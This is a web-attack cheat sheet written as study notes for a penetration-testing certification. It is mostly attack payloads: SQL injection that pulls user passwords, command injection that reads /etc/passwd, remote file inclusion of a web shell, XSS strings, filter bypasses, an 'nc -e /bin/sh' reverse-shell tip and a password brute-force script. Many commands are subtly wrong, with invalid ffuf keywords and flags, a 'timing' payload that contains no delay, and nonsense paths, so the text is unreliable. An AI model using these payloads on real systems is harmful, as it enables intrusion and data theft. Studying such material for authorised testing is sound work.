# 05-Web Attacks CPTS Survival Guide

Exploit web misconfigurations and logic flaws to gain unauthorized access or compromise data. Focus on parameter control, bypass mechanisms, and injection chains.

## Attack Workflow

1. **Enum & Recon**: Discover active endpoints, hidden parameters, and technology stacks.
2. **Identify Targets**: Find writable paths, admin panels, or database access vectors.
3. **Exploit**: Inject payloads, manipulate logic, or trigger errors to reveal sensitive data.
4. **Maintain Access**: Establish reverse shells or file inclusion backdoors.

## Commands Section

### Directory & File Enumeration
```bash
# Basic path enumeration
echo "GET /admin.php?id=1" | curl -s -c - --cookie-jar cookies.txt -b cookies.txt

# Fuzzy testing with FFUF
ffuf -w words.txt -u "http://$TARGET/FFUFSITE" -X GET -q

# Subdomain takeover check (DNS)
nslookup example.com || dig example.com
```

### Database & Sensitive Data Leakage
```bash
# SQL Error-based Injection check
curl "http://$TARGET/product.php?id=1 OR 1=1" -s

# Boolean-based SQLi
for v in $(seq 1 100); do
  curl "http://$TARGET/search.php?term=1' OR $v=' AND '$v='$v" | grep -i "error"
done

# Blind SQLi payload (Timing)
curl "http://$TARGET/search.php?q=1' AND substr((SELECT password FROM users), 1, 1)='a"
```

### Command Injection & RCE
```bash
# Generic Command Injection (OS command)
curl -G "http://$TARGET/vulnerable.php?cmd=id&data="
curl "http://$TARGET/vulnerable.php?cmd=test&data=test" -d "id"

# Bash command injection
curl "http://$TARGET/vuln.php?id=1; cat /etc/passwd"
curl "http://$TARGET/vuln.php?id=1 && whoami"

# PHP Execution via File Inclusion (if PHP exists)
curl -F "file=http://$TARGET/shell.php" "http://$TARGET/includes.php?file="
```

### Bypass Techniques
```bash
# Case-insensitive bypass
curl "http://$TARGET/index.pHp?id=1"

# Character encoding bypass
curl "http://$TARGET/search.php?q=1%6f%72%201%3d%3d%31"

# Attribute bypass
curl "http://$TARGET/search.php?q=<script>alert(1)</script>" -b "user=<script>alert(1)</script>"
```

## Tips & Shortcuts

* **Use `curl -s -k`** to suppress SSL warnings and silent output for scripting.
* **Chain requests**: Use `for` loops to brute-force IDs until you find a writable file or success state.
* **Check for PHP extensions**: `curl "http://$TARGET/proc/version-magic" -s` often reveals installed PHP versions.
* **Reverse Shell**: Use `nc -e /bin/sh` inside a generated web shell if available.
* **Payloads**: Stick to `%00` for null-byte, `&` for ampersand, and `\n` for newlines in strings.

## Common Mistakes

* **Assuming only SQLi**: Most web vulns are XSS, LFI, IDOR, or Logic flaws.
* **Ignoring HTTP Status Codes**: A `200` response might contain an error message inside the body.
* **No Parameter Mapping**: Not knowing which `id` controls `user` vs `limit` is useless.
* **Static Analysis Only**: Don't guess; test every parameter variation.

## Mini Automation Scripts

### Python: Basic SQLi Brute Force
```python
import requests, string
url = "http://$TARGET/search.php"

for char in string.ascii_lowercase:
    r = requests.get(f"{url}?q=1' AND substr((select password from users), 1, 1)='{char}'--")
    if "error" in r.text.lower() or "syntax" in r.text.lower():
        print(f"Error found at {char}")
```

### Bash: FFUF Directory Scan
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://$TARGET/FUFDATA" -x php -q -t 500 -max-age 20m > ffuf_log.txt
grep "/FUFDATA/" ffuf_log.txt | head -20
```

### Bash: Generic Command Test
```bash
for param in "$@"; do
    curl "http://$TARGET/vuln.php?param=$param" -X POST
done
```